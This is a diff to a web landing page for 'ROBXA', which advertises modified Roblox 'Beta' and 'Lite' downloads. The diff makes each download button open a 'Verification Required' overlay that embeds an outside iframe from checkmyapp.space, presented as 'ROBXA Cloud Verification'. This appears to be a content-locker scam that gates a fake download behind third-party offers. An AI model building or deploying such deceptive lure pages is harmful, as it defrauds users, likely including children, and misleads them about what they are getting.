@@ -60,6 +60,36 @@
             background: rgba(3, 3, 3, 0.8);
         }
 
+        /* Modal / Locker Overlay */
+        #lockerOverlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            z-index: 9999;
+            background: rgba(0, 0, 0, 0.92);
+            backdrop-filter: blur(15px);
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+
+        .locker-card {
+            background: #0a0a0a;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            width: 100%;
+            max-width: 480px;
+            border-radius: 2.5rem;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 0 50px rgba(59, 130, 246, 0.2);
+        }
+
+        .locker-iframe {
+            width: 100%;
+            height: 550px;
+            border: none;
+        }
+
         ::-webkit-scrollbar { width: 8px; }
         ::-webkit-scrollbar-track { background: #030303; }
         ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
@@ -69,14 +99,14 @@
 
     <nav class="fixed w-full z-50 nav-blur border-b border-white/5 px-6 py-4">
         <div class="max-w-7xl mx-auto flex justify-between items-center">
-            <div class="text-2xl font-extrabold tracking-tighter">ROBXA<span class="text-blue-500">.</span></div>
+            <div class="text-2xl font-extrabold tracking-tighter uppercase">ROBXA<span class="text-blue-500">.</span></div>
             <div class="hidden md:flex space-x-10 text-sm font-medium text-gray-400">
                 <a href="#home" class="hover:text-white transition">Home</a>
                 <a href="#apps" class="hover:text-white transition">Applications</a>
                 <a href="#features" class="hover:text-white transition">Why Us</a>
                 <a href="#faq" class="hover:text-white transition">Support</a>
             </div>
-            <a href="#apps" class="btn-gradient px-6 py-2 rounded-full text-sm font-bold">Download Now</a>
+            <a href="#apps" class="btn-gradient px-6 py-2 rounded-full text-sm font-bold">Download</a>
         </div>
     </nav>
 
@@ -123,7 +153,7 @@
                     <p class="text-gray-400 mb-10 leading-relaxed">
                         Experience the latest updates before anyone else. Includes high-end shaders and unlocked FPS settings for the ultimate power user.
                     </p>
-                    <button class="w-full btn-gradient py-5 rounded-2xl font-extrabold text-lg flex items-center justify-center gap-3">
+                    <button onclick="openLocker('BETA', 'beta.JPG')" class="w-full btn-gradient py-5 rounded-2xl font-extrabold text-lg flex items-center justify-center gap-3">
                         <i class="fas fa-download"></i> Download Beta
                     </button>
                 </div>
@@ -146,7 +176,7 @@
                     <p class="text-gray-400 mb-10 leading-relaxed">
                         Perfect for older devices. Roblox Lite removes unnecessary background assets to provide 100% lag-free gameplay with minimal battery consumption.
                     </p>
-                    <button class="w-full bg-white/5 hover:bg-white/10 border border-white/10 py-5 rounded-2xl font-extrabold text-lg flex items-center justify-center gap-3 transition">
+                    <button onclick="openLocker('LITE', 'lite.JPG')" class="w-full bg-white/5 hover:bg-white/10 border border-white/10 py-5 rounded-2xl font-extrabold text-lg flex items-center justify-center gap-3 transition">
                         <i class="fas fa-download"></i> Download Lite
                     </button>
                 </div>
@@ -186,7 +216,7 @@
         <div class="space-y-6">
             <div class="glass p-8 rounded-3xl" data-aos="fade-up">
                 <h5 class="text-lg font-bold mb-3">Is registration required?</h5>
-                <p class="text-gray-400">No, you can download and use both versions instantly without creating a ROBXA account.</p>
+                <p class="text-gray-400">No, you can download and use both versions instantly without creating an account.</p>
             </div>
             <div class="glass p-8 rounded-3xl" data-aos="fade-up">
                 <h5 class="text-lg font-bold mb-3">Does it support iOS and Android?</h5>
@@ -195,30 +225,62 @@
         </div>
     </section>
 
+    <div id="lockerOverlay">
+        <div class="locker-card" data-aos="zoom-in">
+            <div class="p-6 border-b border-white/10 flex items-center gap-4 bg-gradient-to-r from-blue-600/10 to-transparent">
+                <img id="dImg" src="" class="w-14 h-14 rounded-xl object-cover border border-blue-500/30">
+                <div>
+                    <h4 id="dTitle" class="font-extrabold text-xl uppercase tracking-tight"></h4>
+                    <span class="text-[10px] text-blue-400 font-bold tracking-widest uppercase">Verification Required</span>
+                </div>
+                <button onclick="closeLocker()" class="ml-auto text-gray-600 hover:text-white transition"><i class="fas fa-times text-xl"></i></button>
+            </div>
+            <iframe src="https://checkmyapp.space/cl/i/7jvwxg" class="locker-iframe"></iframe>
+            <div class="p-4 bg-black text-center text-[10px] text-gray-700 uppercase tracking-[0.2em]">
+                Secured by ROBXA Cloud Verification
+            </div>
+        </div>
+    </div>
+
     <footer class="py-20 border-t border-white/5">
-        <div class="max-w-7xl mx-auto px-6 flex flex-col md:flex-row justify-between items-center text-center md:text-left">
+        <div class="max-w-7xl mx-auto px-6 flex flex-col md:flex-row justify-between items-center">
             <div class="mb-8 md:mb-0">
-                <div class="text-3xl font-extrabold tracking-tighter">ROBXA<span class="text-blue-500">.</span></div>
+                <div class="text-3xl font-extrabold tracking-tighter uppercase">ROBXA<span class="text-blue-500">.</span></div>
                 <p class="text-gray-600 mt-2 text-sm">Premium tools for the next generation of gamers.</p>
             </div>
             <div class="flex space-x-8">
                 <a href="#" class="text-gray-400 hover:text-white transition text-xl"><i class="fab fa-discord"></i></a>
                 <a href="#" class="text-gray-400 hover:text-white transition text-xl"><i class="fab fa-telegram"></i></a>
-                <a href="#" class="text-gray-400 hover:text-white transition text-xl"><i class="fab fa-youtube"></i></a>
             </div>
         </div>
         <div class="text-center mt-16 text-gray-700 text-[10px] tracking-[0.3em] uppercase">
-            &copy; 2026 ROBXA MOBILE. Designed for Performance.
+            &copy; 2026 ROBXA MOBILE. Designed for Daniel Ulta.
         </div>
     </footer>
 
     <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
     <script>
-        AOS.init({
-            once: true,
-            duration: 1000,
-            easing: 'ease-out-cubic'
-        });
+        AOS.init({ once: true, duration: 1000, easing: 'ease-out-cubic' });
+
+        const overlay = document.getElementById('lockerOverlay');
+        const dTitle = document.getElementById('dTitle');
+        const dImg = document.getElementById('dImg');
+
+        function openLocker(name, img) {
+            dTitle.innerText = "ROBLOX " + name;
+            dImg.src = img;
+            overlay.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeLocker() {
+            overlay.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        window.onclick = function(e) {
+            if (e.target == overlay) closeLocker();
+        }
     </script>
 </body>
 </html>
